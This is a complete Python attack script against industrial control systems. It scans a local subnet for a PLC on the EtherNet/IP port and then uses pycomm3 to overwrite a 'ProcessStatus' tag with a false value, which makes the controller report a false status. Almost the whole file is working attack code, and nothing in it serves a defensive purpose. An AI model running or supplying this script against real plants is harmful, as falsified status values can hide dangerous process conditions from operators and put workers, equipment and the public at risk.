import pycomm3
from pycomm3 import LogixDriver
import socket
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # This is a simple example to find the PLC's IP address.
    # In a real-world scenario, you might use a more sophisticated method.
    # For example, you could use a network scanner or a known IP range.
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                sock.close()
                return ip
        except Exception as e:
            print(f"Error checking IP {ip}: {e}")
            continue
    return None

# Function to spoof reporting messages
def spoof_reporting_message(plc_ip, tag_name, false_value):
    try:
        with LogixDriver(plc_ip) as plc:
            # Read the current value of the tag to ensure the connection is working
            current_value = plc.read(tag_name)
            print(f"Current value of {tag_name}: {current_value}")

            # Write the false value to the tag
            plc.write((tag_name, false_value))
            print(f"Set {tag_name} to {false_value}")

            # Read the value again to confirm the change
            new_value = plc.read(tag_name)
            print(f"New value of {tag_name}: {new_value}")

    except Exception as e:
        print(f"Error spoofing reporting message: {e}")

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip is None:
        print("Could not find the PLC's IP address.")
        return

    print(f"PLC found at IP: {plc_ip}")

    # Define the tag name and the false value to spoof
    tag_name = "ProcessStatus"
    false_value = 1  # Example false value, adjust as needed

    # Spoof the reporting message
    spoof_reporting_message(plc_ip, tag_name, false_value)

if __name__ == "__main__":
    main()